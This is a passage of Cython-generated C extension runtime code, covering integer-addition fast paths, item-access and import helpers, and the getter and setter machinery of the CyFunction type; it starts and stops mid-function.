    (void)zerodivision_check;
    #if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long x;
        long a = PyInt_AS_LONG(op1);
            x = (long)((unsigned long)a + b);
            if (likely((x^a) >= 0 || (x^b) >= 0))
                return PyInt_FromLong(x);
            return PyLong_Type.tp_as_number->nb_add(op1, op2);
    }
    #endif
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        const long b = intval;
        long a, x;
#ifdef HAVE_LONG_LONG
        const PY_LONG_LONG llb = intval;
        PY_LONG_LONG lla, llx;
#endif
        const digit* digits = ((PyLongObject*)op1)->ob_digit;
        const Py_ssize_t size = Py_SIZE(op1);
        if (likely(__Pyx_sst_abs(size) <= 1)) {
            a = likely(size) ? digits[0] : 0;
            if (size == -1) a = -a;
        } else {
            switch (size) {
                case -2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = (long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = (long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = (long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                default: return PyLong_Type.tp_as_number->nb_add(op1, op2);
            }
        }
                x = a + b;
            return PyLong_FromLong(x);
#ifdef HAVE_LONG_LONG
        long_long:
                llx = lla + llb;
            return PyLong_FromLongLong(llx);
#endif
        
        
    }
    #endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
        double a = PyFloat_AS_DOUBLE(op1);
            double result;
            PyFPE_START_PROTECT("add", return NULL)
            result = ((double)a) + (double)b;
            PyFPE_END_PROTECT(result)
            return PyFloat_FromDouble(result);
    }
    return (inplace ? PyNumber_InPlaceAdd : PyNumber_Add)(op1, op2);
}
#endif

/* DictGetItem */
#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
static PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key) {
    PyObject *value;
    value = PyDict_GetItemWithError(d, key);
    if (unlikely(!value)) {
        if (!PyErr_Occurred()) {
            if (unlikely(PyTuple_Check(key))) {
                PyObject* args = PyTuple_Pack(1, key);
                if (likely(args)) {
                    PyErr_SetObject(PyExc_KeyError, args);
                    Py_DECREF(args);
                }
            } else {
                PyErr_SetObject(PyExc_KeyError, key);
            }
        }
        return NULL;
    }
    Py_INCREF(value);
    return value;
}
#endif

/* GetItemInt */
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j) {
    PyObject *r;
    if (!j) return NULL;
    r = PyObject_GetItem(o, j);
    Py_DECREF(j);
    return r;
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyList_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyList_GET_SIZE(o)))) {
        PyObject *r = PyList_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyTuple_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyTuple_GET_SIZE(o)))) {
        PyObject *r = PyTuple_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i, int is_list,
                                                     CYTHON_NCP_UNUSED int wraparound,
                                                     CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS && CYTHON_USE_TYPE_SLOTS
    if (is_list || PyList_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyList_GET_SIZE(o);
        if ((!boundscheck) || (likely(__Pyx_is_valid_index(n, PyList_GET_SIZE(o))))) {
            PyObject *r = PyList_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    }
    else if (PyTuple_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyTuple_GET_SIZE(o);
        if ((!boundscheck) || likely(__Pyx_is_valid_index(n, PyTuple_GET_SIZE(o)))) {
            PyObject *r = PyTuple_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    } else {
        PySequenceMethods *m = Py_TYPE(o)->tp_as_sequence;
        if (likely(m && m->sq_item)) {
            if (wraparound && unlikely(i < 0) && likely(m->sq_length)) {
                Py_ssize_t l = m->sq_length(o);
                if (likely(l >= 0)) {
                    i += l;
                } else {
                    if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                        return NULL;
                    PyErr_Clear();
                }
            }
            return m->sq_item(o, i);
        }
    }
#else
    if (is_list || PySequence_Check(o)) {
        return PySequence_GetItem(o, i);
    }
#endif
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
}

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* ImportFrom */
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name) {
    PyObject* value = __Pyx_PyObject_GetAttrStr(module, name);
    if (unlikely(!value) && PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Format(PyExc_ImportError,
        #if PY_MAJOR_VERSION < 3
            "cannot import name %.230s", PyString_AS_STRING(name));
        #else
            "cannot import name %S", name);
        #endif
    }
    return value;
}

/* PyObjectGetMethod */
static int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method) {
    PyObject *attr;
#if CYTHON_UNPACK_METHODS && CYTHON_COMPILING_IN_CPYTHON && CYTHON_USE_PYTYPE_LOOKUP
    PyTypeObject *tp = Py_TYPE(obj);
    PyObject *descr;
    descrgetfunc f = NULL;
    PyObject **dictptr, *dict;
    int meth_found = 0;
    assert (*method == NULL);
    if (unlikely(tp->tp_getattro != PyObject_GenericGetAttr)) {
        attr = __Pyx_PyObject_GetAttrStr(obj, name);
        goto try_unpack;
    }
    if (unlikely(tp->tp_dict == NULL) && unlikely(PyType_Ready(tp) < 0)) {
        return 0;
    }
    descr = _PyType_Lookup(tp, name);
    if (likely(descr != NULL)) {
        Py_INCREF(descr);
#if PY_MAJOR_VERSION >= 3
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || (Py_TYPE(descr) == &PyMethodDescr_Type) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr) || (Py_TYPE(descr) == &PyMethodDescr_Type)))
        #endif
#else
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr)))
        #endif
#endif
        {
            meth_found = 1;
        } else {
            f = Py_TYPE(descr)->tp_descr_get;
            if (f != NULL && PyDescr_IsData(descr)) {
                attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
                Py_DECREF(descr);
                goto try_unpack;
            }
        }
    }
    dictptr = _PyObject_GetDictPtr(obj);
    if (dictptr != NULL && (dict = *dictptr) != NULL) {
        Py_INCREF(dict);
        attr = __Pyx_PyDict_GetItemStr(dict, name);
        if (attr != NULL) {
            Py_INCREF(attr);
            Py_DECREF(dict);
            Py_XDECREF(descr);
            goto try_unpack;
        }
        Py_DECREF(dict);
    }
    if (meth_found) {
        *method = descr;
        return 1;
    }
    if (f != NULL) {
        attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
        Py_DECREF(descr);
        goto try_unpack;
    }
    if (descr != NULL) {
        *method = descr;
        return 0;
    }
    PyErr_Format(PyExc_AttributeError,
#if PY_MAJOR_VERSION >= 3
                 "'%.50s' object has no attribute '%U'",
                 tp->tp_name, name);
#else
                 "'%.50s' object has no attribute '%.400s'",
                 tp->tp_name, PyString_AS_STRING(name));
#endif
    return 0;
#else
    attr = __Pyx_PyObject_GetAttrStr(obj, name);
    goto try_unpack;
#endif
try_unpack:
#if CYTHON_UNPACK_METHODS
    if (likely(attr) && PyMethod_Check(attr) && likely(PyMethod_GET_SELF(attr) == obj)) {
        PyObject *function = PyMethod_GET_FUNCTION(attr);
        Py_INCREF(function);
        Py_DECREF(attr);
        *method = function;
        return 1;
    }
#endif
    *method = attr;
    return 0;
}

/* PyObjectCallMethod1 */
static PyObject* __Pyx__PyObject_CallMethod1(PyObject* method, PyObject* arg) {
    PyObject *result = __Pyx_PyObject_CallOneArg(method, arg);
    Py_DECREF(method);
    return result;
}
static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg) {
    PyObject *method = NULL, *result;
    int is_method = __Pyx_PyObject_GetMethod(obj, method_name, &method);
    if (likely(is_method)) {
        result = __Pyx_PyObject_Call2Args(method, obj, arg);
        Py_DECREF(method);
        return result;
    }
    if (unlikely(!method)) return NULL;
    return __Pyx__PyObject_CallMethod1(method, arg);
}

/* append */
static CYTHON_INLINE int __Pyx_PyObject_Append(PyObject* L, PyObject* x) {
    if (likely(PyList_CheckExact(L))) {
        if (unlikely(__Pyx_PyList_Append(L, x) < 0)) return -1;
    } else {
        PyObject* retval = __Pyx_PyObject_CallMethod1(L, __pyx_n_s_append, x);
        if (unlikely(!retval))
            return -1;
        Py_DECREF(retval);
    }
    return 0;
}

/* FetchCommonType */
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type) {
    PyObject* fake_module;
    PyTypeObject* cached_type = NULL;
    fake_module = PyImport_AddModule((char*) "_cython_" CYTHON_ABI);
    if (!fake_module) return NULL;
    Py_INCREF(fake_module);
    cached_type = (PyTypeObject*) PyObject_GetAttrString(fake_module, type->tp_name);
    if (cached_type) {
        if (!PyType_Check((PyObject*)cached_type)) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s is not a type object",
                type->tp_name);
            goto bad;
        }
        if (cached_type->tp_basicsize != type->tp_basicsize) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s has the wrong size, try recompiling",
                type->tp_name);
            goto bad;
        }
    } else {
        if (!PyErr_ExceptionMatches(PyExc_AttributeError)) goto bad;
        PyErr_Clear();
        if (PyType_Ready(type) < 0) goto bad;
        if (PyObject_SetAttrString(fake_module, type->tp_name, (PyObject*) type) < 0)
            goto bad;
        Py_INCREF(type);
        cached_type = type;
    }
done:
    Py_DECREF(fake_module);
    return cached_type;
bad:
    Py_XDECREF(cached_type);
    cached_type = NULL;
    goto done;
}

/* CythonFunctionShared */
#include <structmember.h>
static PyObject *
__Pyx_CyFunction_get_doc(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *closure)
{
    if (unlikely(op->func_doc == NULL)) {
        if (op->func.m_ml->ml_doc) {
#if PY_MAJOR_VERSION >= 3
            op->func_doc = PyUnicode_FromString(op->func.m_ml->ml_doc);
#else
            op->func_doc = PyString_FromString(op->func.m_ml->ml_doc);
#endif
            if (unlikely(op->func_doc == NULL))
                return NULL;
        } else {
            Py_INCREF(Py_None);
            return Py_None;
        }
    }
    Py_INCREF(op->func_doc);
    return op->func_doc;
}
static int
__Pyx_CyFunction_set_doc(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp = op->func_doc;
    if (value == NULL) {
        value = Py_None;
    }
    Py_INCREF(value);
    op->func_doc = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_name(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_name == NULL)) {
#if PY_MAJOR_VERSION >= 3
        op->func_name = PyUnicode_InternFromString(op->func.m_ml->ml_name);
#else
        op->func_name = PyString_InternFromString(op->func.m_ml->ml_name);
#endif
        if (unlikely(op->func_name == NULL))
            return NULL;
    }
    Py_INCREF(op->func_name);
    return op->func_name;
}
static int
__Pyx_CyFunction_set_name(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    tmp = op->func_name;
    Py_INCREF(value);
    op->func_name = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_qualname(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_qualname);
    return op->func_qualname;
}
static int
__Pyx_CyFunction_set_qualname(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    tmp = op->func_qualname;
    Py_INCREF(value);
    op->func_qualname = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_self(__pyx_CyFunctionObject *m, CYTHON_UNUSED void *closure)
{
    PyObject *self;
    self = m->func_closure;
    if (self == NULL)
        self = Py_None;
    Py_INCREF(self);
    return self;
}
static PyObject *
__Pyx_CyFunction_get_dict(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_dict == NULL)) {
        op->func_dict = PyDict_New();
        if (unlikely(op->func_dict == NULL))
            return NULL;
    }
    Py_INCREF(op->func_dict);
    return op->func_dict;
}
static int
__Pyx_CyFunction_set_dict(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
    if (unlikely(value == NULL)) {
        PyErr_SetString(PyExc_TypeError,
               "function's dictionary may not be deleted");
        return -1;
    }
    if (unlikely(!PyDict_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
               "setting function's dictionary to a non-dict");
        return -1;
    }
    tmp = op->func_dict;
    Py_INCREF(value);
    op->func_dict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_globals(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_globals);
    return op->func_globals;
}
static PyObject *
__Pyx_CyFunction_get_closure(CYTHON_UNUSED __pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(Py_None);
    return Py_None;
}
static PyObject *
__Pyx_CyFunction_get_code(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    PyObject* result = (op->func_code) ? op->func_code : Py_None;
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_init_defaults(__pyx_CyFunctionObject *op) {
    int result = 0;
    PyObject *res = op->defaults_getter((PyObject *) op);
    if (unlikely(!res))
        return -1;
    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    op->defaults_tuple = PyTuple_GET_ITEM(res, 0);
    Py_INCREF(op->defaults_tuple);
    op->defaults_kwdict = PyTuple_GET_ITEM(res, 1);
    Py_INCREF(op->defaults_kwdict);
    #else
    op->defaults_tuple = PySequence_ITEM(res, 0);
    if (unlikely(!op->defaults_tuple)) result = -1;
    else {
        op->defaults_kwdict = PySequence_ITEM(res, 1);
        if (unlikely(!op->defaults_kwdict)) result = -1;
    }
    #endif
    Py_DECREF(res);
    return result;
}
static int
__Pyx_CyFunction_set_defaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyTuple_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__defaults__ must be set to a tuple object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_tuple;
    op->defaults_tuple = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_defaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_tuple;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_tuple;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_kwdefaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__kwdefaults__ must be set to a dict object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_kwdict;
    op->defaults_kwdict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_kwdefaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_kwdict;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_kwdict;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_annotations(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value || value == Py_None) {
        value = NULL;
    } else if (!PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__annotations__ must be set to a dict object");
        return -1;
    }
    Py_XINCREF(value);
    tmp = op->func_annotations;
    op->func_annotations = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_annotations(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->func_annotations;
    if (unlikely(!result)) {
        result = PyDict_New();
        if (unlikely(!result)) return NULL;
        op->func_annotations = result;
    }
    Py_INCREF(result);
    return result;
}
static PyGetSetDef __pyx_CyFunction_getsets[] = {
    {(char *) "func_doc", (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "__doc__",  (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "func_name", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__name__", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__qualname__", (getter)__Pyx_CyFunction_get_qualname, (setter)__Pyx_CyFunction_set_qualname, 0, 0},
    {(char *) "__self__", (getter)__Pyx_CyFunction_get_self, 0, 0, 0},
    {(char *) "func_dict", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "__dict__", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "func_globals", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "__globals__", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "func_closure", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "__closure__", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "func_code", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "__code__", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "func_defaults", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__defaults__", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__kwdefaults__", (getter)__Pyx_CyFunction_get_kwdefaults, (setter)__Pyx_CyFunction_set_kwdefaults, 0, 0},
    {(char *) "__annotations__", (getter)__Pyx_CyFunction_get_annotations, (setter)__Pyx_CyFunction_set_annotations, 0, 0},
    {0, 0, 0, 0, 0}
};
static PyMemberDef __pyx_CyFunction_members[] = {
    {(char *) "__module__", T_OBJECT, offsetof(PyCFunctionObject, m_module), PY_WRITE_RESTRICTED, 0},
    {0, 0, 0,  0, 0}
};
static PyObject *
__Pyx_CyFunction_reduce(__pyx_CyFunctionObject *m, CYTHON_UNUSED PyObject *args)
{
#if PY_MAJOR_VERSION >= 3
    Py_INCREF(m->func_qualname);
    return m->func_qualname;
#else
    return PyString_FromString(m->func.m_ml->ml_name);
#endif
}
static PyMethodDef __pyx_CyFunction_methods[] = {
    {"__reduce__", (PyCFunction)__Pyx_CyFunction_reduce, METH_VARARGS, 0},
    {0, 0, 0, 0}
};
#if PY_VERSION_HEX < 0x030500A0
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func_weakreflist)
#else
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func.m_weakreflist)
#endif
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject *op, PyMethodDef *ml, int flags, PyObject* qualname,
                                       PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    if (unlikely(op == NULL))
        return NULL;
    op->flags = flags;
    __Pyx_CyFunction_weakreflist(op) = NULL;
    op->func.m_ml = ml;
    op->func.m_self = (PyObject *) op;
    Py_XINCREF(closure);
    op->func_closure = closure;
    Py_XINCREF(module);
    op->func.m_module = module;
    op->func_dict = NULL;
    op->func_name = NULL;
    Py_INCREF(qualname);
    op->func_qualname = qualname;
    op->func_doc = NULL;
    op->func_classobj = NULL;
    op->func_globals = globals;
    Py_INCREF(op->func_globals);
    Py_XINCREF(code);
    op->func_code = code;
    op->defaults_pyobjects = 0;
    op->defaults_size = 0;
    op->defaults = NULL;
    op->defaults_tuple = NULL;
    op->defaults_kwdict = NULL;
    op->defaults_getter = NULL;
    op->func_annotations = NULL;
    return (PyObject *) op;
}
static int
__Pyx_CyFunction_clear(__pyx_CyFunctionObject *m)
{
    Py_CLEAR(m->func_closure);
    Py_CLEAR(m->func.m_module);
    Py_CLEAR(m->func_dict);
    Py_CLEAR(m->func_name);
    Py_CLEAR(m->func_qualname);
    Py_CLEAR(m->func_doc);
    Py_CLEAR(m->func_globals);
    Py_CLEAR(m->func_code);
    Py_CLEAR(m->func_classobj);
    Py_CLEAR(m->defaults_tuple);
    Py_CLEAR(m->defaults_kwdict);
    Py_CLEAR(m->func_annotations);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_XDECREF(pydefaults[i]);
        PyObject_Free(m->defaults);
        m->defaults = NULL;
    }
    return 0;
}
static void __Pyx__CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    if (__Pyx_CyFunction_weakreflist(m) != NULL)
        PyObject_ClearWeakRefs((PyObject *) m);
    __Pyx_CyFunction_clear(m);
    PyObject_GC_Del(m);
}
static void __Pyx_CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    PyObject_GC_UnTrack(m);
    __Pyx__CyFunction_dealloc(m);
}
static int __Pyx_CyFunction_traverse(__pyx_CyFunctionObject *m, visitproc visit, void *arg)
{
    Py_VISIT(m->func_closure);
    Py_VISIT(m->func.m_module);
    Py_VISIT(m->func_dict);
    Py_VISIT(m->func_name);
    Py_VISIT(m->func_qualname);
    Py_VISIT(m->func_doc);
    Py_VISIT(m->func_globals);
    Py_VISIT(m->func_code);
    Py_VISIT(m->func_classobj);
    Py_VISIT(m->defaults_tuple);
    Py_VISIT(m->defaults_kwdict);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
